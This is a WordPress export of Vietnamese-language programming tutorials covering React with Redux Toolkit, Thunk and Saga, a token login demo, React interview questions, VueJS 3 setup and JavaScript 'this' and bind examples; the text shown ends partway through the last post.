		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="reactjs"><![CDATA[ReactJS]]></category>
						</item>
					<item>
		<title><![CDATA[Demo-Count: 7. use Redux-Toolkit, Thunk middleware]]></title>
		<link>https://duycode.com/2021/06/28/demo-count-7-use-redux-toolkit-thunk-middleware/</link>
		<pubDate>Mon, 28 Jun 2021 00:00:16 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1664</guid>
		<description></description>
		<content:encoded><![CDATA[<pre>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Demo app Count with use ReactJS and Redux</title>
</head>

<body>
    <div id="root"></div>
    <script crossorigin src="https://unpkg.com/react@17/umd/react.development.js"></script>
    <script crossorigin src="https://unpkg.com/react-dom@17/umd/react-dom.development.js"></script>
    <script src="https://unpkg.com/babel-standalone@6/babel.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/redux/4.1.0/redux.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/react-redux/7.2.4/react-redux.js"></script>

    <script src="https://cdn.jsdelivr.net/npm/@reduxjs/toolkit@1.6.0/dist/redux-toolkit.umd.min.js"></script>

    <!-- =========== slices/count_slice.js =========== -->
    <script>
        //1. Khai báo Slice: Dùng RTK.createSlice khai báo tất cả State, Reducers và Actions luôn
        const countSlice = RTK.createSlice({
            name: 'count',
            initialState: { amount: 1 },
            reducers: {
                action_increment(state, action) {
                    state.amount += action.payload.amount;
                },
                action_decrement(state, action) {
                    state.amount -= action.payload.amount;
                },
            }
        });
        // Export ra các actions, reducer tương ứng :D
        const { action_increment, action_decrement } = countSlice.actions;
        const countReducer = countSlice.reducer;
    </script>

    <!-- =========== src/api/count.js =========== -->
    <script>
        // Important: Middleware: Các action dạng bất đồng bộ thì sẽ xử lý tại đây
        // TH này, giải quyết middleware bằng "redux-thunk" (đã tự động cài ở RTK)
        // Tại button, ta dispatch 1 function có dạng trả về là 1 async function
        // async function này có nhiệm vụ giải quyết các promise, sau đó mới dispatch action thật
        const increment_async = (payload) => async (dispatch) => {
            let promise = (data) => new Promise((resolve, reject) => {
                setTimeout(() => {
                    resolve(data);
                }, 1000);
            })
            let response = await promise(payload);
            dispatch(action_increment(response));
        }
    </script>

    <!-- =========== src/store.js =========== -->
    <script type="text/babel">
        //2. Khai báo store bằng "configureStore": tất cả các Reducer trong store ở dưới đây
        //configureStore: mặc định đã có "thunk"
        const store = RTK.configureStore({
            reducer: {
                count: countReducer
            }
        })
    </script>

    <!-- =========== components/App.js =========== -->
    <script type="text/babel">
        function App(props) {
            //3. Dùng useSelector và useDispatch để làm việc với store của Redux
            const count = ReactRedux.useSelector(state => state.count);
            const dispatch = ReactRedux.useDispatch();
            return (
                <div>
                    <p>{count.amount}</p>
                    <button onClick={() => { dispatch(action_increment({ amount: 1 })) }}>Increase</button>
                    <button onClick={() => { dispatch(action_decrement({ amount: 1 })) }}>Decrease</button><br />
                    <button onClick={() => { dispatch(increment_async({ amount: 1 })) }}>Increase Async</button>
                </div>
            )
        }
    </script>

    <!-- =========== src/index.js =========== -->
    <script type="text/babel">
        //4. Connect React và Redux bằng Provider, với store=store đã được khai báo ở trên
        const Provider = ReactRedux.Provider;
        ReactDOM.render(
            <Provider store={store}>
                <App />
            </Provider>,
            document.getElementById('root')
        );
    </script>
</body>

</html>
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1664</wp:post_id>
		<wp:post_date><![CDATA[2021-06-28 07:00:16]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-06-28 00:00:16]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-06-28 07:00:16]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-06-28 00:00:16]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[demo-count-7-use-redux-toolkit-thunk-middleware]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="reactjs"><![CDATA[ReactJS]]></category>
						</item>
					<item>
		<title><![CDATA[Demo-Count: 8. use Redux-Toolkit, Redux-Saga: Effect Creator]]></title>
		<link>https://duycode.com/2021/06/28/demo-count-8-use-redux-toolkit-redux-saga-effect-creator/</link>
		<pubDate>Mon, 28 Jun 2021 01:00:56 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1666</guid>
		<description></description>
		<content:encoded><![CDATA[<pre>
    <!DOCTYPE html>
    <html lang="en">
    
    <head>
        <meta charset="UTF-8" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>Demo app Count with use ReactJS and Redux</title>
    </head>
    
    <body>
        <div id="root"></div>
        <script crossorigin src="https://unpkg.com/react@17/umd/react.development.js"></script>
        <script crossorigin src="https://unpkg.com/react-dom@17/umd/react-dom.development.js"></script>
        <script src="https://unpkg.com/babel-standalone@6/babel.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/redux/4.1.0/redux.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/react-redux/7.2.4/react-redux.js"></script>
    
        <script src="https://cdn.jsdelivr.net/npm/@reduxjs/toolkit@1.6.0/dist/redux-toolkit.umd.min.js"></script>
        <script src="https://unpkg.com/redux-saga@1.1.3/dist/redux-saga.umd.js"></script>
    
        <!-- =========== slices/count_slice.js =========== -->
        <script>
            //1. Khai báo Slice: Dùng RTK.createSlice khai báo tất cả State, Reducers và Actions luôn
            const countSlice = RTK.createSlice({
                name: 'count',
                initialState: { number: 1, loading: false },
                reducers: {
                    action_increment(state, action) {
                        state.number += action.payload.amount;
                    },
                    action_decrement(state, action) {
                        state.number -= action.payload.amount;
                    },
                    action_increment_saga_request(state, action) {
                        state.loading = true;
                    },
                    action_increment_saga_success(state, action) {
                        state.loading = false;
                        state.number += action.payload.amount;
                    },
                }
            });
            // Export ra các actions, reducer tương ứng :D
            const countReducer = countSlice.reducer;
            const {
                action_increment,
                action_decrement,
                action_increment_saga_request,
                action_increment_saga_success
            } = countSlice.actions;

        </script>
    
        <!-- =========== src/api/count.js =========== -->
        <script>
            // Thunk - Middleware: Các action dạng bất đồng bộ thì sẽ xử lý tại đây
            // Tại button, ta dispatch 1 function có dạng trả về là 1 async function
            // async function này có nhiệm vụ giải quyết các promise, sau đó mới dispatch action thật
            const increment_async = (payload) => async (dispatch) => {
                let promise = (data) => new Promise((resolve, reject) => {
                    setTimeout(() => {
                        resolve(data);
                    }, 1000);
                })
                let response = await promise(payload);
                dispatch(action_increment(response));
            }
        </script>
    
        <!-- =========== src/middleware/saga.js =========== -->
        <script>
            // Saga.0: Ta giả lập 1 cái promise như sau:
            const promise_count = (n) => new Promise((resolve, reject) => {
                setTimeout(() => {
                    resolve(n);
                }, 2000);
            })

            // //Saga.5: Khai báo Saga worker: Những thằng handle saga còn lại có nhiệm vụ worker
            const handle_increment_saga = function* (action) {
                let response = yield promise_count(action.payload);
                // Có thể delay bằng cách
                // yield delay(2000);
                // put ==> kích hoạt action :D, đi hết middleware 1 vòng rồi đó
                yield ReduxSaga.effects.put(action_increment_saga_success(response))
            }

            //Saga.4: Khai báo Saga watcher: Thằng này chỉ có nhiệm vụ đón các action và giao nhiệm vụ cho các saga khác
            const countSaga = function* () {
                //Các effect creator hay gặp: takeEvery, takeLatest, takeLeading
                yield ReduxSaga.effects.takeEvery(action_increment_saga_request().type, handle_increment_saga)
            }
            const otherSaga = function* () {
                // console.log("Other saga");
                // RootSaga sẽ khởi chạy tất cả các saga khác lần đầu tiên khi khởi động
            }
            // Saga.3: Khai báo rootSaga
            const rootSaga = function* () {
                yield ReduxSaga.effects.all([countSaga(), otherSaga()])
            }
        </script>
    
        <!-- =========== src/store.js =========== -->
        <script type="text/babel">
            // 2. Saga.1: Khai báo sagaMiddleware (xem thêm trên trang chủ cách khai báo khi sử dụng npm install)
            const sagaMiddleware = ReduxSaga.default();
            // Saga.2: Khai báo store sử dụng middleware Saga
            //configureStore: mặc định đã có "thunk"
            const store = RTK.configureStore({
                reducer: {
                    count: countReducer
                },
                middleware: getDefaultMiddleware => getDefaultMiddleware().concat(sagaMiddleware),   //sài thêm "sagaMiddleware"
            })

            // Saga.3: Khởi chạy rootSaga sau khi được mount vào Store 
            sagaMiddleware.run(rootSaga);
        </script>
    
        <!-- =========== components/App.js =========== -->
        <script type="text/babel">
            function App(props) {
                //3. Dùng useSelector và useDispatch để làm việc với store của Redux
                const count = ReactRedux.useSelector(state => state.count);
                const dispatch = ReactRedux.useDispatch();
                return (
                    <div>
                        <p>
                            {count.number}
                            {count.loading && <img src="https://vcdn-ione.vnecdn.net/2016/07/13/loading-256-0001-4566-1468383063.gif" width="12px" />}
                        </p>
                        <button onClick={() => { dispatch(action_increment({ amount: 1 })) }}>Increase</button>
                        <button onClick={() => { dispatch(action_decrement({ amount: 1 })) }}>Decrease</button><br />
                        <button onClick={() => { dispatch(increment_async({ amount: 1 })) }}>Increase Thunk</button><br />
                        <button onClick={() => { dispatch(action_increment_saga_request({ amount: 1 })) }}>Increase Saga takeEvery</button>
                    </div>
                )
            }
        </script>
    
        <!-- =========== src/index.js =========== -->
        <script type="text/babel">
            //4. Connect React và Redux bằng Provider, với store=store đã được khai báo ở trên
            const Provider = ReactRedux.Provider;
            ReactDOM.render(
                <Provider store={store}>
                    <App />
                </Provider>,
                document.getElementById('root')
            );
        </script>
    </body>
    
    </html>
    </pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1666</wp:post_id>
		<wp:post_date><![CDATA[2021-06-28 08:00:56]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-06-28 01:00:56]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-06-28 08:00:56]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-06-28 01:00:56]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[demo-count-8-use-redux-toolkit-redux-saga-effect-creator]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="reactjs"><![CDATA[ReactJS]]></category>
						</item>
					<item>
		<title><![CDATA[Demo-Authenticator: Login, Logout bằng Token]]></title>
		<link>https://duycode.com/2021/06/30/demo-authenticator-login-logout-bang-token/</link>
		<pubDate>Tue, 29 Jun 2021 18:00:42 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1724</guid>
		<description></description>
		<content:encoded><![CDATA[<pre>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>ReactJS</title>
    <style>
        table {
            border-collapse: collapse;
        }

        th,
        td {
            padding: 0 0.5rem;
            border: 1px solid black;
        }
    </style>
</head>

<body>
    <div id="root"></div>
    <script crossorigin src="https://unpkg.com/react@17/umd/react.development.js"></script>
    <script crossorigin src="https://unpkg.com/react-dom@17/umd/react-dom.development.js"></script>
    <script src="https://unpkg.com/babel-standalone@6/babel.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/redux/4.1.0/redux.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/react-redux/7.2.4/react-redux.js"></script>

    <script src="https://cdn.jsdelivr.net/npm/@reduxjs/toolkit@1.6.0/dist/redux-toolkit.umd.min.js"></script>


    <!-- =========== slices/auth_slice.js =========== -->
    <script>
        const authSlice = RTK.createSlice({
            name: 'authSlice',
            initialState: {
                info: {},
                token: { accessToken: null, expirationTime: null },
                loading: false
            },
            reducers: {
                action_loginRequest(state, action) {
                    state.loading = true;
                },
                action_loginSuccess(state, action) {
                    state.token = action.payload;
                    state.loading = false;
                },
                action_logout(state, action) {
                    state.token = {};
                    state.info = {};
                },
                action_getInfoRequest(state, action) {
                    state.loading = true;
                },
                action_setInfoUser(state, action) {
                    state.info = {
                        name: action.payload.name,
                        phone: action.payload.phone,
                    }
                    state.loading = false;
                }
            }
        })

        const auth_reducer = authSlice.reducer;
        const { action_loginRequest, action_loginSuccess, action_logout, action_getInfoRequest, action_setInfoUser } = authSlice.actions;
    </script>

    <!-- =========== src/api/authAPI =========== -->
    <script type="text/babel">
        //Đăng nhập chỉ để lấy token
        const api_login = ({ username, password }) => async (dispatch) => {
            try {
                dispatch(action_loginRequest());
                let url = "https://learn-api.jmaster.io:8443/api/login";
                let config = {
                    method: 'POST',
                    headers: new Headers({
                        'Content-Type': "application/x-www-form-urlencoded",
                        'Cookie': "",
                    }),
                    body: new URLSearchParams({
                        'username': username,
                        'password': password,
                    }),
                    redirect: 'follow'
                };
                let response = await fetch(url, config);
                let responseJSON = await response.json();
                dispatch(action_loginSuccess(responseJSON));
            } catch (err) {
                console.log(err);
            }
        }

        //Dùng token để get thông tin user
        const api_getUser = (token) => async (dispatch) => {
            try {
                dispatch(action_getInfoRequest());
                let url = 'https://learn-api.jmaster.io:8443/api/member/me';
                let config = {
                    method: 'GET',
                    headers: new Headers({
                        'Authorization': "Bearer " + token,
                        'Content-Type': "application/x-www-form-urlencoded",
                        'Cookie': "",
                    }),
                    redirect: 'follow'
                };

                let response = await fetch(url, config);
                let responseJSON = await response.json();
                dispatch(action_setInfoUser(responseJSON));
            } catch (err) {
                console.log(err);
            }
        }
    </script>

    <!-- =========== src/store.js =========== -->
    <script type="text/babel">
        const store = RTK.configureStore({
            reducer: {
                auth: auth_reducer,
            }
        })
    </script>

    <!-- =========== components/App.js =========== -->
    <script type="text/babel">
        function Login(props) {
            const auth = ReactRedux.useSelector(state => state.auth);
            const dispatch = ReactRedux.useDispatch();

            const [username, setUsername] = React.useState('0123456789');
            const [password, setPassword] = React.useState('123456');

            return (
                <div>
                    <input value={username} onChange={e => { setUsername(e.target.value) }} /> <br />
                    <input
                        type="password" value={password}
                        onChange={e => { setPassword(e.target.value) }}
                    /> <br />
                    <button onClick={e => { dispatch(api_login({ username, password })) }}>Login</button>
                    {auth.loading && <img src="http://www.vitinhdaivu.com/assets/imgs/ajax-loader.gif" width="18px" />}
                </div>
            );
        }

        function Profile(props) {
            const auth = ReactRedux.useSelector(state => state.auth);
            const dispatch = ReactRedux.useDispatch();
            React.useEffect(() => {
                dispatch(api_getUser(auth.token.accessToken));
            }, [])

            return (
                <div>
                    <p>Name: {auth.loading ? <img src="http://www.vitinhdaivu.com/assets/imgs/ajax-loader.gif" width="18px" /> : auth.info.name}</p>
                    <p>Phone: {auth.loading ? <img src="http://www.vitinhdaivu.com/assets/imgs/ajax-loader.gif" width="18px" /> : auth.info.phone}</p>
                    <button onClick={() => { dispatch(action_logout()) }}>Logout</button>
                </div>
            )
        }

        function App(props) {
            const auth = ReactRedux.useSelector(state => state.auth);
            return (
                // Nếu có token thì dùng token lấy thông tin, nếu không thì phải đăng nhập
                <div>
                    <p>Token: {JSON.stringify(auth.token, null, '\t')}</p>
                    {auth.token.accessToken ? <Profile /> : <Login />}
                </div>
            );
        }
    </script>

    <!-- =========== src/index.js =========== -->
    <script type="text/babel">
        const Provider = ReactRedux.Provider;
        ReactDOM.render(
            <Provider store={store}>
                <App />
            </Provider>,
            document.getElementById('root')
        );
    </script>
</body>

</html>
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1724</wp:post_id>
		<wp:post_date><![CDATA[2021-06-30 01:00:42]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-06-29 18:00:42]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-06-30 01:00:42]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-06-29 18:00:42]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[demo-authenticator-login-logout-bang-token]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="reactjs"><![CDATA[ReactJS]]></category>
						</item>
					<item>
		<title><![CDATA[Những câu hỏi phỏng vấn ReactJS]]></title>
		<link>https://duycode.com/2021/07/28/fetch-trong-javascript/</link>
		<pubDate>Wed, 28 Jul 2021 04:47:55 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=870</guid>
		<description></description>
		<content:encoded><![CDATA[1. Phân biệt VueJS và ReactJS => reactJS sử dụng JSX để render ra view, còn VueJS thì dùng template
2. Bạn nghe nói đến JSX chưa? JSX là cú pháp mở rộng cho Javascript để mô tả giao diện, sử dụng cú pháp XML.
Các XML elements, attributes và children được chuyển đổi thành các đối số truyền vào React.createElement.
3. Bạn có sử dụng Redux không, dùng middleware nào không? => Có dùng, dùng Redux-saga và Redux-thunk, dùng redux để quản lý state của nhiều component
4. Mô tả mô hình redux => View call action -> action dispatch -> change state trong reducer -> cập nhật lại store -> render lại view
5. Bạn làm như nào để quản lý hiệu năng? => tối ưu hiệu năng, bằng cách tránh re render không cần thiết, sử dụng useMemo, useCalback, lazyload, paging trong grid có nhiều bản ghi
6. Bản sử dụng công cụ package management nào? => Dùng npm và Yarn
7. NPM và Yarn khác gì nhau? Npm thì install các dependencies lần lượt, còn Yarrn thì install song song các dependencies
8. Webpack là công cụ giúp đóng gói toàn bộ file js, css
9. Cross browsing: đa trình duyệt, áp dụng trên nhiều trình duyệt như IE, chrome, firefox, safari, opera.
10. để tránh việc bị lỗi các thư viện khi sử dụng trên IE phiên bản cũ thì có thể dùng webpack để biên dịch code phù hợp với nhiều trình duyệt
- Chuyển đổi các mã nguồn : JSX, less, sass, scss thành js, ... ES6 -> ES5 thông qua babel transpiler
11. Babel là 1 công cụ chuyển đổi các mã JS, ES thành các phiên bản cũ hơn (ví dụ từ ES6 -> ES5, SASS -> CSS)
12. Bạn hay dùng react hook hay class component.
13. Redux dùng để làm gì? có tác dụng gì?
14. các cách để tăng performance phía front-end: dùng cache, lazy load (search thêm)
15. khác nhau giữa các method xử lý mảng (foreach, map, filter, find, some)
16. lifecycle của react?
17. local storage, session storage, cookie khác nhau ntn?
18. ES6 có gì mới? arrow function, let, var, spead syntax, Promise,..(tìm hiểu kĩ mấy cái đấy)]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>870</wp:post_id>
		<wp:post_date><![CDATA[2021-07-28 11:47:55]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-07-28 04:47:55]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-07-28 11:47:55]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-07-28 04:47:55]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[fetch-trong-javascript]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="reactjs"><![CDATA[ReactJS]]></category>
						</item>
					<item>
		<title><![CDATA[VueJS3 - 2. Cấu trúc thư mục và quản lý các Module]]></title>
		<link>https://duycode.com/2021/07/15/vuejs-2-cau-truc-thu-muc-va-quan-ly-cac-module/</link>
		<pubDate>Wed, 14 Jul 2021 19:00:50 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1097</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>1. Tổ chức folder của </h2>
<pre>
.
├── node_modules
├── src
│    ├── api
│    │    ├── axiosClient.js
│    │    ├── productApi.js
│    │    ├── categoryApi.js
│    │    └── ...
│    ├── components
│    │    ├── App.vue
│    │    ├── Product.vue
│    │    ├── Category.vue
│    │    └── ...
│    ├── pages
│    │    ├── HomePage
│    │    ├── LoginPage
│    │    ├── RegisterPage
│    │    └── 404Page
│    ├── store.js
│    │    ├── index.js 
│    │    ├── actions.js
│    │    ├── mutations.js 
│    │    └── modules
│    │         ├── product.js
│    │         └── cart.js
│    └── main.js
├── public
│    ├── ...
│    └── index.html
├── .env
├── .gitignore
├── package-lock.json
├── package.json
└── Procfile
</pre>
- Tham khảo thêm: <a href="https://github.com/PanJiaChen/vue-element-admin/tree/master/src" rel="noopener" target="_blank">https://github.com/PanJiaChen/vue-element-admin/tree/master/src</a>

<h2>II. Các Module thường dùng</h2>
1. State Management: Vuex

2. Form Module


3. API Module

4. Routing Module

5. UI/UX Module
-- Boottrap 
-- SCSS + BEM
-- Material UI
-- Ant Design

6. Frameworks
-- NuxtJS

III. Khác
Những vấn đề cần nhớ
teleport to=""
public: netlify.app\

Giả lập server: npm i -g json-server
]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1097</wp:post_id>
		<wp:post_date><![CDATA[2021-07-15 02:00:50]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-07-14 19:00:50]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-08-07 00:51:21]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-08-07 00:51:21]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[vuejs-2-cau-truc-thu-muc-va-quan-ly-cac-module]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="vuejs-v2"><![CDATA[VueJS-v2]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[VueJS3 - 1. Tổng quan và cài đặt]]></title>
		<link>https://duycode.com/2021/07/15/vuejs-1-tong-quan-va-cai-dat/</link>
		<pubDate>Wed, 14 Jul 2021 18:00:09 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1283</guid>
		<description></description>
		<content:encoded><![CDATA[<strong><em>*** Tổng quan :</em></strong>
-- Homepage:<a href="https://v3.vuejs.org/" rel="noopener" target="_blank">https://v3.vuejs.org/</a>
-- Github: <a href="https://github.com/vuejs" rel="noopener" target="_blank">https://github.com/vuejs</a>
-- VueCLI: <a href="https://cli.vuejs.org/" rel="noopener" target="_blank">https://cli.vuejs.org/</a>

<em>-- Có 2 cách chính để sử dụng Vue:</em>
1. Dùng ở client, sử dụng VueJS dạng <strong>script tag</strong>

2. Dùng trong môi trường server
* Lợi ích của dùng server:
- Chạy trên môi trường thực tế, dùng dạng https://blabla.com
- Gọi từng phần component, template -> giảm kích cỡ file trong dự án -> optimize hệ thống hơn

<h1>I. Dùng ở Client</h1>
-- Một ví dụ đơn giản dùng Vue dạng CDN như sau:


<h1>II. Dùng ở môi trường server</h1>
<h2>1. Cài NodeJS và npm hoặc yarn</h2>
- Download và cài đặt: https://nodejs.org/en/download/
- Khi cài NodeJS sẽ mặc định được cài cả npm luôn (không cài gói python kèm theo)
- Cài yarn
<blockquote>npm i -g yarn</blockquote>
- Kiểm tra version <strong>node</strong> và <strong>npm </strong>bằng terminal của VSCode
<blockquote>
node -v
npm -v
yarn -v
</blockquote>

<h2>2. Cài đặt VueCLI</h2>
-- Homepage VueCLI: <a href="https://cli.vuejs.org/guide/installation.html" rel="noopener" target="_blank">https://cli.vuejs.org/guide/installation.html</a>
-- Cài đặt vue/cli
<blockquote>
### Cài đặt vue-cli bằng npm và yarn (nên cài cả 2)
npm install -g @vue/cli
yarn global add @vue/cli

### Kiểm tra sau cài đặt
vue --version
vue -V
</blockquote>

<h2>3. Khởi tạo dự án</h2>
<blockquote>
vue create demovue3
### Lựa chọn các tính năng theo nhu cầu
cd demovue3
yarn serve
</blockquote>

-- Project đã được tạo, link: <a href="http://localhost:8080/" rel="noopener" target="_blank">http://localhost:8080/</a>


<h1>III. Cài đặt VScode</h1>
<h2>1. Cài đặt extensions for VScode</h2>
-- Vetur

<h2>2. Snippets></h2>
-- Vào File > Preferences > User snippets > New Global snippets file ...
-- Điền tên File và nội dung như sau
<pre>
{
	"Default Vue": {
		"scope": "vue",
		"prefix": ["vue", "cvue"],
		"body": [
			"<template>",
			"\t<div>",
			"\t\t$0",
			"\t</div>",
			"</template>",
			"",
			"<script>",
			"export default {",
			"\tdata() {",
			"\t\treturn {",
			"\t\t\t",
			"\t\t}",
			"\t},",
			"",
			"\tmethods: {",
			"\t\t",
			"\t},",
			"}",
			"</script>",
			"",
			"<style scoped>",
			"\t",
			"</style>"
		],
		"description": "Demo file Vue "
	}
}
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1283</wp:post_id>
		<wp:post_date><![CDATA[2021-07-15 01:00:09]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-07-14 18:00:09]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-08-07 00:51:28]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-08-07 00:51:28]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[vuejs-1-tong-quan-va-cai-dat]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="vuejs-v2"><![CDATA[VueJS-v2]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[Bind, Apply, Call và This trong Javascript]]></title>
		<link>https://duycode.com/2021/07/03/bind-apply-call-va-this-trong-javascript/</link>
		<pubDate>Sat, 03 Jul 2021 15:31:39 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1316</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>1. This trong ES6
<pre>
<!DOCTYPE html>
<html lang="en">

<head>
    <script>
        const mouse = {
            aa: function () { // -----> có tạo context là mouse
                console.log(this); //===> mouse
                const a1 = function () {
                    console.log(this); //===> window
                };
                const a2 = () => {
                    console.log(this); //===> mouse
                };
                a1();
                a2();
            },
            bb: () => { // -----> không tạo context
                console.log(this); //===> window
                const b1 = function () {
                    console.log(this); //===> window
                };
                const b2 = () => {
                    console.log(this); //===> window
                };
                b1();
                b2();
            },
            cc: {
                cx: function () { // -----> có tạo context là mouse.cc
                    console.log(this); //===> mouse.cc
                    const c1 = function () {
                        console.log(this); //===> window
                    };
                    const c2 = () => {
                        console.log(this); //===> mouse.cc
                    };
                    c1();
                    c2();
                },
            },
            dd: {
                dx: () => { // -----> không tạo context
                    console.log(this); //===> window
                    const d1 = function () {
                        console.log(this); //===> window
                    };
                    const d2 = () => {
                        console.log(this); //===> window
                    };
                    d1();
                    d2();
                },
            }
        };
        mouse.aa();
        mouse.bb();
        mouse.cc.ww();
        mouse.dd.dx();
    </script>
</head>

</html>
</pre>

<h2>2. Bind, Apply và Call trong Javascript
<pre>
<!DOCTYPE html>
<html lang="en">

<head>
    <script>
        const example = {
            data: 1000,
            func1: function (param1, param2, param3) {
                console.log(this, param1, param2, param3)
            },
            // arrow function không có this => apply,call và bind không sử dụng context được
            func2: (param1, param2, param3) => {
                console.log(this, param1, param2, param3)
            },
        }
        const convert = { data: 99 }

        example.func1(123, 456)   // {data: 1000, func1: ƒ, func2: ƒ} 123 456 undefined
        console.log("====================================================================")

        convert.func1 = example.func1.bind(convert, 123, 456);
